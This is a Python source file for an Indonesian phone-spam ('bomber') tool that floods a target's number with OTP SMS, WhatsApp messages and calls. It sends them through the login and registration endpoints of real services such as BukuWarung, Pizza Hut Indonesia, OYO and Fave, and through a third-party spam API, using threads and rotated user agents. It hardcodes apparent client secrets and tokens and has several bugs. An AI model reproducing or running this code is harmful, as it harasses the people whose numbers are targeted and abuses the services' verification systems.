import os,sys,time,requests,json,random,re,sys,bs4,concurrent.futures
from requests import post
#from gtts import gTTS
from requests import get
from concurrent.futures import ThreadPoolExecutor
#from thunder import *
def emilP(teks):
        tuks=teks.replace("\x1b[1;90m","").replace("\x1b[1;91m","").replace("\x1b[1;92m","").replace("\x1b[1;93m","").replace("\x1b[1;94m","").replace("\x1b[1;95m","").replace("\x1b[1;96m","").replace("\x1b[1;97m","").replace("ʕ x_×ʔ","")
        suara=gTTS(text=tuks,lang="id").save(".virus.mp3")
        print(teks)
        os.system("play-audio .virus.mp3 & ")
def emilS(teks):
        tuks=teks.replace("\x1b[1;90m","").replace("\x1b[1;91m","").replace("\x1b[1;92m","").replace("\x1b[1;93m","").replace("\x1b[1;94m","").replace("\x1b[1;95m","").replace("\x1b[1;96m","").replace("\x1b[1;97m","").replace("ʕ x_×ʔ","")
        suara=gTTS(text=tuks,lang="id").save(".virus.mp3")
        os.system("play-audio .virus.mp3 & ")
#from bin.McybearX import iklan
Bismillahirohmanirrohim = "Aaammiin"
#emilS("Selamat Datang di M spam X by M cybearX X")
# KOLOR
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
p = "\x1b[1;97m"
# McybearX !!!
emil=print
bts=0
unligak=[]
usup=input
sistem = os.system
def iklan():
	pass
#	sistem("cd ../../bin && python3 McybearX.py")
ua = open("_McybearX_.txt","r").readlines()
kantor=requests.Session()
mx = u+"ʕ"+m+" x"+u+"_"+m+"×"+u+"ʔ"
sup = "\x1b[4;95m               \x1b[0;95m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;90m"
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
def ting():
	pass
#	sistem("cd ../../.sound && play-audio ting.wav")
def animasi(McybearX):
	for suport in McybearX + "\n":
		sys.stdout.write(suport)
		sys.stdout.flush()
		time.sleep(1./100)
def klir():
	sistem("clear")
def logo():
    animasi("""
\x1b[1;91m     __  ___ \x1b[1;95m                             \x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m_____ ____   ____ _ ____ ___  \x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;95m/ ___// __ \ / __ `// __ `__ \ \x1b[1;91m|   / 
\x1b[1;91m  / /  / /\x1b[1;97m(__  )/ /_/ // /_/ // / / / / /\x1b[1;91m/   |  
\x1b[1;91m /_/  /_/\x1b[1;97m/____// .___/ \__,_//_/ /_/ /_/\x1b[1;91m/_/|_|  \x1b[1;97mby \x1b[1;91m𝙼\x1b[1;95m𝚌𝚢𝚋𝚎𝚊𝚛\x1b[1;91m𝚇
\x1b[1;91m         \x1b[1;97m     /_/                                  """)
def kolor():
	aw=[]
	emil(u+"\n ["+m+"o1"+u+"]"+p+" Ganti title (info)")
	emil(u+" ["+m+"o2"+u+"]"+p+" Ganti title (author)")
	emil(u+" ["+m+"o3"+u+"]"+p+" Ganti title (github)")
	emil(sup)
	cia=int(usup(mx+p+" No : "+m))
	ciu=usup(mx+p+" Masukan Title Baru : ")
	if cia==1:
		open(".custome/.info","w").write(ciu)
		menu()
	elif cia==2:
		open(".custome/.author","w").write(ciu)
		menu()
	elif cia==3:
		open(".custome/.github","w").write(ciu)
		menu()
	else:
		emil(mx+m+" Input Salah!!!")
		time.sleep(2)
		menu()
def menu():
	global nohap,koin,tot
	try:
		os.mkdir(".custome")
		open(".custome/.info","a")
		open(".custome/.author","a")
		open(".custome/.github","a")
	except:
		pass
	klir()
	logo()
	emil(u+" ["+m+"×"+u+"] "+k+"Info    "+p+":"+k, open(".custome/.info","r").read().replace("\n",""))
	emil(u+" ["+m+"𝚡"+u+"] "+p+"Author  :", str(open(".custome/.author","r").read().replace("\\"," ")))
	emil(u+" ["+m+"X"+u+"] "+m+"Youtube"+p+" : MBEWLEGS")
	emil(u+" ["+m+"𝚡"+u+"] "+p+"Github  :"+b, open(".custome/.github","r").read().replace("\n",""))
#	emil(u+" ["+m+"×"+u+"] "+p+"Your Ip :"+l, kantor.get("https://api.ipify.org").text)
	emil("\x1b[1;95m￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣\x1b[0;00m")
	emil(u+" ["+m+"o1"+u+"]"+p+" Spam Sms "+b+"("+p+"BukuWarung"+b+")")
	emil(u+" ["+m+"o2"+u+"]"+p+" Spam Call "+b+"("+p+"BTS"+b+")")
	emil(u+" ["+m+"o3"+u+"]"+p+" Spam Wa "+b+"("+p+"Tokped"+b+")")
	emil(u+" ["+m+"o4"+u+"]"+p+" Spam Brutal Masal "+b+"("+p+"sms"+b+"+"+p+"wa"+b+"+"+p+"call"+b+")")
	emil(u+" ["+m+"o5"+u+"]"+p+" Spam Brutal Masal File.txt ")
	emil(u+" ["+m+"o6"+u+"]"+p+" Spam Brutal Masal list.json ")
	emil(u+" ["+m+"o7"+u+"]"+p+" Buat List file.json ")
	emil(u+" ["+m+"o8"+u+"]"+p+" Custome")
	emil(u+" ["+m+"o9"+u+"]"+p+" Join Grup Wa")
	emil(sup)
#	time.sleep(1)
#	emilS("silahkan pilih salah satu fitur ini")
	puput = usup(mx+p+" No : "+m)
	if puput=="1" or puput=="01":
		nohap = usup(mx+p+" Nomor Target : +62")
		metod = "SMS"
		buku_warung(metod,nohap)
	elif puput=="2" or puput=="02":
		nohap = usup(mx+p+" Nomor Target : +62")
		spam_call(nohap)
	elif puput=="3" or puput=="03":
		nohap = usup(mx+p+" Nomor Target : +62")
		tokped(nohap)
	elif puput=="4" or puput=="04":
		kokon=0
		haphap=[]
		jumget = int(usup(mx+p+" Jumlah Target : "))
		for live in range(jumget):
			kokon+=1
			nohnoh = usup(mx+p+f" Masukan No target ke {kokon} : +62")
			haphap.append(nohnoh)
		Emil = int(usup(mx+p+" Jumlah Spam   : "))
		with ThreadPoolExecutor(max_workers=30) as kintil:
			for nohap in haphap:
				brutal(nohap,Emil)
#				kintil.submit(brutal,nohap,Emil)
	elif puput=="5" or puput=="05":
		haphap=[]
		pile = input(mx+p+" Masukan Nama File : ")
		Emil = int(input(mx+p+" Jumlah Spam : "))
		pule = open(pile,"r")
		for up in pule:
			haphap.append(up.replace("\n",""))
		with ThreadPoolExecutor(max_workers=30) as kintil:
			for nohap in haphap:
				emil(nohap)
				kintil.submit(brutal,nohap,Emil)
	elif puput=="6" or puput=="06":
		haphap=[]
		try:
			pile = input(mx+p+" Masukan Nama File : ")
			pule = open(pile,"r").read()
		except FileNotFoundError:
			print(m+" File Tidak Ditemukan !!!");time.sleep(2)
			menu()
		Emil = int(input(mx+p+" Jumlah Spam : "))
		for up in pule["data"]:
			emil(pule["data"]["no"])
			haphap.append(pule["data"]["no"])
		with ThreadPoolExecutor(max_workers=30) as kintil:
			for nohap in haphap:
				emil("ini nohap",nohap)
#				kintil.submit(brutal,nohap,Emil)
	elif puput=="8" or puput=="08":
		kolor()
	elif puput=="9" or puput=="09":
		sistem("xdg-open https://cararegistrasi.com/Abu2QKwEO")
	else:
		animasi(mx+p+" Pilihan "+m+puput+p+" Gada Di Menu Tod!!!")
		time.sleep(3)
		menu()
def spam_call():
	Emil = int(usup(mx+p+" Jumlah Spam : "))
	emil(u+" ["+k+"!"+u+"]"+k+" Limit 30 detik")
	for kepin in range(Emil):
		call_bts(nohap)
		cunuy(nohap)
		time.sleep(10)
def unlititit(nohap,Emil):
	emil("\x1b[1;91m Mode Unlimited Aktif... \x1b[1;92m")
	for love in range(Emil):
		buku_warung_sms(nohap)
		cunuy(nohap)
		buku_warung_sms(nohap)
itung=0
def brutal(nohap,Emil):
	emil("\x1b[1;92m")
	for love in range(Emil):
		itung =+ 1
		if "yoi" in unligak:
			emil("\n\x1b[1;91m Mode Unlimited Aktif...\n\x1b[1;92m")
			buku_warung_sms(nohap)
			cunuy(nohap)
			buku_warung_wa(nohap)
		elif itung==range(20):
			unligak.delete("yoi")
		else:
#			for pov in range(5):
			buku_warung_sms(nohap)
			call_bts(nohap)
			cunuy(nohap)
			buku_warung_wa(nohap)
			nutriclub(nohap)
			piza(nohap)
			fav(nohap)
			OYO(nohap)
#			if itung==range(3):
#			unligak.append("yoi")
#		kintil.submit(adakami,nohap)
def buku_warung_wa(nohap):
	metod = "WA"
	buku_warung(metod,nohap)
def buku_warung_sms(nohap):
	metod = "SMS"
	buku_warung(metod,nohap)
def buku_warung(metod,nohap):
	uhah = random.choice(ua).replace("\n","")
	palalo = {"Host": "api-v2.bukuwarung.com","Connection": "keep-alive","Content-Length": "194","sec-ch-ua-mobile": "?1","x-app-version-name": "3.7.2","User-Agent": uhah,"Content-type": "application/json; charset=utf-8","Access-Control-Allow-Origin": "*","accept": "*/*","x-app-version-code": "3300","Origin": "https://app.bukuwarung.com","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.bukuwarung.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	samson = {"action":"LOGIN_OTP","countryCode":"+62","deviceId":"","phone":nohap,"method":metod,"clientId":"d504e926-aca8-41ca-ab37-68fe44067e7b","clientSecret":"I7ueetTSL4K1lYioaWlqPyd5I0t7RmBF"}
	url = "https://api-v2.bukuwarung.com:443/api/v2/auth/otp/send"
	rek = requests.post(url,headers=palalo,json=samson)
	haha = json.loads(rek.text) #["status"]
	emil(haha)
#	if "OTP_SENT" in haha:
#		emil(u+" ["+h+"x"+u+"]"+p+" BukuWarung "+metod+" Sukses >> "+nohap)
#	else:
#		emil(haha)
#		emil(u+" ["+m+"x"+u+"]"+k+" BukuWarung Limit...")
def call_bts(nohap):
	uhah = random.choice(ua).replace("\n","");	palalo = {	"Host": "id.jagreward.com",	"Connection": "keep-alive",	"Accept": "*/*",	"X-Requested-With": "XMLHttpRequest",	"sec-ch-ua-mobile": "?1",	"User-Agent": uhah,	"Sec-Fetch-Site": "same-origin",	"Sec-Fetch-Mode": "cors",	"Sec-Fetch-Dest": "empty",	"Referer": "https://id.jagreward.com/member/register/",	"Accept-Encoding": "gzip, deflate, br",	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",	'Cookie': 'PHPSESSID=kvo0um7je1ignbnod57013fbqb; DAPROPS="sjs.webGlRenderer:Mali-G52|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2.700000047683716|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.415155992.1641991248; _gid=GA1.3.444351545.1641991248; _gat=1'	};	link = "https://id.jagreward.com/member/verify-mobile/"+nohap;	_emiil_ = kantor.get(link,headers=palalo);_usupp_ = json.loads(_emiil_.text);	res = _usupp_["result"]
	emil(_usupp_)
#	if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in _usupp_:emil(u+" ["+h+"x"+u+"]"+p+" Call Bts Sukses >> "+nohap)
#	else:emil(_usupp_) #emil(u+" ["+h+"x"+u+"]"+p+" Call Bts Sukses >> "+nohap)
def cunuy(nohap):
	req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nohap}).text
	emil(req)
#	if "terkirim" in req:		emil(u+" ["+h+"x"+u+"]"+p+" Bonus BOM Sms Terkirim >> "+nohap)
#	elif "Internal Server Error" in req:		emil(u+"["+m+"x"+u+"]"+k+" Limit...")
#	else:emil(req) #emil(u+" ["+h+"x"+u+"]"+p+" Bonus BOM Sms Terkirim >> "+nohap)
def nutriclub(nohap):
	nom="0"+nohap
	rek=requests.post('https://www.nutriclub.co.id/otp/?phone='+nom+'&old_phone='+nom)
	ruk=json.loads(rek.text) #["StatusCode"]
	emil(ruk)
#	if 'Kode OTP berhasil dikirim' in ruk:
#		emil(u+" ["+h+"x"+u+"]"+p+" NutriClub Sukses >> "+nohap)
#	elif "30" in ruk:
#		emil(u+" ["+h+"x"+u+"]"+p+" NutriClub limit...")
#	else:
#		emil(ruk)
#		emil(u+" ["+h+"x"+u+"]"+p+" NutriClub Sukses >> "+nohap)
def piza(nohap):
	uhah = random.choice(ua).replace("\n","")
	ijat="a","b","c","d","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
	sat = random.choice(ijat)
	palalo={
	"Host": "api-prod.pizzahut.co.id",
	"Connection": "keep-alive",
	"Content-Length": f"{random.randint(150,170)}",
	"sec-ch-ua-mobile": "?1",
	"x-platform": "WEBMOBILE",
	"X-CHANNEL": "2",
	"Content-Type": "application/json;charset=UTF-8",
	"Accept": "application/json",
	"X-CLIENT-ID": f"{sat}{random.randint(10000,40000)}{sat}{random.randint(0,9)}-435b-4f41-80e9-163eef20e0ab",
	"User-Agent": uhah,
	"X-LANG": "en",
	"X-DEVICE-ID": "web",
	"Origin": "https://www.pizzahut.co.id",
	"Sec-Fetch-Site": "same-site",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://www.pizzahut.co.id/",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	dat={
	"email": "KamuKenaPrank123@gmail.com",
	"first_name":"SUBSCRIBE",
	"gender":2,
	"last_name":"YtMbewLegs",
	"password": "Pasipuripasipapa_321",
	"phone":nohap,
	"birthday": "2006-03-12"
	}
	cup = kantor.post("https://api-prod.pizzahut.co.id:443/customer/v1/customer/register",headers=palalo,json=dat).text
	emil(cup)
#	if "You have reached max. of 3 OTPs for today. Please contact Customer Service support on 1500600 to help you forward" in cup:
#		emil(cup)
#		emil(u+" ["+h+"x"+u+"]"+p+" PizzaHut Limit >> "+nohap)
#	elif "Successful" in cup:
#		emil(u+" ["+h+"x"+u+"]"+p+" PizzaHut Sukses >> "+nohap)
#	else:
#		emil(cup)
def fav(nohap):
	uhah=random.choice(ua).replace("\n","")
	hd = {"Host": "api.myfave.com","Connection": "keep-alive","x-user-agent": "Fave-PWA/v1.0.0","User-Agent": uhah,"content-type": "application/json","Accept": "*/*","Origin": "https://m.myfave.com","Referer": "https://m.myfave.com/jakarta/auth","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	dat = {'phone':'62'+nohap}
	x = kantor.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
	emil(x)
#	if "request_id" in x:
#		emil(u+" ["+h+"x"+u+"]"+p+" Fav Sukses >> "+nohap)
#	else:
#		emil(x)
#		emil(u+" ["+h+"x"+u+"]"+p+" Fav Sukses >> "+nohap)
########
def OYO(nohap):
	uhah=random.choice(ua).replace("\n","")
	hd = {
    "Host": "identity-gateway.oyorooms.com",
    "consumer_host": "https://www.oyorooms.com",
    "accept-language": "id",
    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
    "User-Agent": uhah,
    "Content-Type": "application/json",
    "accept": "*/*",
    "origin": "https://www.oyorooms.com",
    "referer": "https://www.oyorooms.com/login",
    "Accept-Encoding": "gzip, deflate, br",
	}
	dat=json.dumps({"phone":nohap,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
	y = kantor.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers=hd,data=dat)
	y1 = json.loads(y.text) #["otp_sent"]
	emil(y1)
#	if y1 == True:
#		emil(u+" ["+h+"x"+u+"]"+p+" OYO Sukses >> "+nohap)
#	else:
#		emil(y1)
#		emil(u+" ["+h+"x"+u+"]"+p+" OYO Sukses >> "+nohap)
def money():
	klir()
	logo()
	emil("""

\x1b[1;96m• \x1b[1;97mDownload Password in link here
\x1b[1;96m• \x1b[1;97mLink : [ \x1b[1;96mhttps://cararegistrasi.com/TokenMspamXV5\x1b[1;97m ]
""")
	Emill=usup(u+" ["+m+"X"+u+"]"+p+" Masukan Pasword : ")
	if Emill=="01001101 01100011 01111001 01100010 01100101 01100001 01110010 01011000" or Emill=="Mcyb34rX":
		menu()
	else:
		animasi(" Password Salah...");time.sleep(1)
		os.system("xdg-open https://youtube.com/c/MBEWLEGS")
		money()

if Bismillahirohmanirrohim == "Aaammiin":
	money()
#	menu()
